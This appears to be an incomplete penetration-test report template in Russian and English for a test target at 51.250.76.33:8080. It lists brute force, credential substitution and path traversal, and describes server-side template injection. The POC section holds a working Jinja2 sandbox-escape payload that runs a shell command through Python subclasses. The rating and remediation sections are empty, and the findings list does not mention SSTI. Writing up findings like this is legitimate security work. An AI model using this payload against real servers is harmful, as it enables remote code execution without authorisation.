# Содержимое
- [[#hackforums|hackforums]]
	- [[#hackforums#Оценка|Оценка]]
	- [[#hackforums#Описание|Описание]]
	- [[#hackforums#POC (Proof of Concept)|POC (Proof of Concept)]]
	- [[#hackforums#Рекомендации по устранению|Рекомендации по устранению]]

# Область тестирования

| IP/домен     | Порт | Сервис      |
| ------------ | ---- | ----------- |
| 51.250.76.33 | 8080 | .hackforums |

# Найденные уязвимости

- Brutforce
- Substitution of credentials
- Path traversal
## Issue tracking system
### Оценка 

### Описание
> Web applications commonly use server side templating technologies (Jinja2, Twig, FreeMaker, etc.) to generate dynamic HTML responses. Server Side Template Injection vulnerabilities (SSTI) occur when user input is embedded in a template in an unsafe manner and results in remote code execution on the server. Any features that support advanced user-supplied markup may be vulnerable to SSTI including wiki-pages, reviews, marketing applications, CMS systems etc. Some template engines employ various mechanisms (eg. sandbox, whitelisting, etc.) to protect against SSTI.

### POC (Proof of Concept)
```shell
''.__class__.__base__.__subclasses__()[351]('whoami', shell=True, stdout=-1).communicate()
```
![[Pasted image 20240326173049.png]]
### Рекомендации по устранению
* 


